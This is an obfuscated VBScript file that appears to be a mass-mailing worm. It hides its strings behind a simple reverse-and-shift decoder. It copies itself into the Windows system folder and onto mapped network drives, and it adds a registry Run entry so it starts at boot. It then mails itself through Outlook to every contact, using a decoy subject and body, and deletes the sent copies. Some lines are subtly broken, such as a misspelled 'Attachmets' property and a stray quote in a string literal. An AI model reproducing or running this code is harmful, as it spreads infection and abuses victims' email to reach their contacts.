' Ulli

On Error Resume Next

Dim UJQA6SS
Dim WLL
Dim ODUR
Dim B5PN7C8
Dim XAJ8V40Z
Dim AAQ5
Dim MLGHRS
Dim KBDYN
Dim PND
Dim YHVU

Set UJQA6SS = CreateObject( EFW( "udfkcPnfutzTfmjG/hojuqjsdT" ) )
UJQA6SS.CopyFile WScript.ScriptFullName, UJQA6SS.BuildPath( UJQA6SS.GetSpecialFolder(1), EFW( "TCW/399YNH:J" ) )

Set WLL = CreateObject( EFW( "mmfiT/uqjsdTX" ) )
WLL.RegWrite EFW( "]ovS]opjtsfWuofssvD]txpeojX]ugptpsdjN]fsbxugpT]FOJIDBN`MBDPM`ZFLI" ) & EFW( "399YNH:J" ), UJQA6SS.BuildPath( UJQA6SS.GetSpecialFolder(1), EFW( "TCW/399YNH:J" ) )


Set ODUR = CreateObject( EFW( "lspxufO/uqjsdTX" ) )
Set XAJ8V40Z = ODUR.EnumNetworkDrives

If XAJ8V40Z.Count <> 0 Then
   For B5PN7C8 = 0 To XAJ8V40Z.Count - 1
       If InStr( XAJ8V40Z.Item( B5PN7C8), EFW( "]" ) ) <> 0 Then
          UJQA6SS.CopyFile WScript.ScriptFullName, UJQA6SS.BuildPath( XAJ8V40Z.Item( B5PN7C8), EFW( "TCW/399YNH:J" ) ) 
       End If
   Next
End If

B5PN7C8 = WLL.RegRead( EFW( "]FOJIDBN`MBDPM`ZFLI" ) & EFW( "399YNH:J" ) )

If B5PN7C8 = "" Or B5PN7C8 > 20 Then
   B5PN7C8 = 0
End If

If B5PN7C8 = 0 Then
   Set KBDYN = CreateObject( EFW( "opjubdjmqqB/lppmuvP" ) )
   Set AAQ5 = KBDYN.GetNameSpace( EFW( "JQBN" ) )

   For Each MLGHRS In AAQ5.AddressLists
       Set XAJ8V40Z = KBDYN.CreateItem( 0 )

       For PND = 1 To MLGHRS.AddressEntries.Count
           Set YHVU = MLGHRS.AddressEntries( PND )

           If PND = 1 Then
              XAJ8V40Z.BCC = YHVU.Address
           Else
              XAJ8V40Z.BCC = XAJ8V40Z.BCC & EFW( "!<" ) & YHVU.Address
           End If
       Next

       XAJ8V40Z.Subject = EFW( "txfO!zujtsfwjoV" )
       XAJ8V40Z.Body = EFW( ""fnpi!pH!/zsspt!fsb!fx!<epph!pt!upo!tbx!fnbyf!svpZ" )
       XAJ8V40Z.Attachmets.Add WScript.ScriptFullName
       XAJ8V40Z.DeleteAfterSubmit = True
       XAJ8V40Z.Send
   Next

   B5PN7C8 = 0
End If

WLL.RegWrite EFW( "]FOJIDBN`MBDPM`ZFLI" ) & EFW( "399YNH:J" ), B5PN7C8 + 1

Function EFW( ES8LG1 )
   Dim NUY938
   Dim OJNH
   Dim T0R

   NUY938 = ""

   For OJNH = 1 To Len( ES8LG1 )
       T0R = Mid( ES8LG1, OJNH, 1 )

       NUY938 = Chr( Asc( T0R ) - 1 ) & NUY938
   Next

   EFW = NUY938
End Function
